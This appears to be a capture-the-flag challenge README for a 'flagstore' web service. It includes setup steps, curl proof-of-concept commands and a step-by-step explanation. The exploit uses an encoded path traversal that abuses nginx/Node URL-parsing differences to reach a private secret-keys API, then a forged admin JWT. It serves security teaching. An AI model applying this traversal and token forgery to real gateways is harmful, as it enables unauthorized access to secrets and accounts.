# Description
I built flagstore using MSA!
Please verify store is secure
```sh
http://flagstore.sstf.site:8000
```

# Distribution
```sh
cd dist
./setup.sh
# flagstore.tar.gz is generated
```

# Setup
```sh
cd deploy
# copy required files from ../src
./setup.sh
cd FLAGSTORE
# deploy
docker-compose up
```

# PoC
Access private API using path traversal
```sh
curl -i -s -k 'http://flagstore.sstf.site:8000/api/user/%2e%2e%2f_secret/keys%23%2f%2e%2e%2f%2e%2e'
```
Sign JWT with secret key, login as admin
```sh
curl -i -s -k -b 'jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwiaWQiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0._BTZTPaZus-NcuubXlhWyS1a5g9UllKyf7FWUu2cIic' 'http://flagstore.sstf.site:8000/api/order/orders'
```


# Intended solution

Root cause of this vulnerability is inconsistency URL parsing between nginx and node

1. In api-nginx, ngnix normalize path to match rules. As a result, bypass private API deny rule

| raw requst | parsed URL |
| - | - |
| `/api/user/%2e%2e%2f_secret/keys%23%2f%2e%2e%2f%2e%2e` | `/api/user/../_secret/keys#/../..` → `/api` |

2. In api-nginx, proxy-pass rule sends raw-request path if URI(e.g. '/') is not specified 
 `/api/user/%2e%2e%2f_secret/keys%23%2f%2e%2e%2f%2e%2e` is passed to gateway

3. In gateway router matching, Node `url` module doesn't decode %2f('/'), request passes gateway config rule (matching to user)

| before | after |
| - | - |
| `/api/user/%2e%2e%2f_secret/keys%23%2f%2e%2e%2f%2e%2e` | `/api/user/..%2f_secret/keys%23%2f..%2f..` |

4. In gateway, all URL encoded characters are decoded as path variable, and traslate

| before | path variable | pathRewrite |
| - | - | - |
| `/api/user/..%2f_secret/keys%23%2f..%2f..` | `/api/user/../_secret/keys#/../..` | `/user/../_secret/keys#/../..` |

5. In gateway proxy, node `url` module normalize path to send request

| before | after |
| - | - |
| `/user/../_secret/keys#/../..` | `/_secret/keys`

6. ms-nginx dispatches request to private API `/_secret/keys`

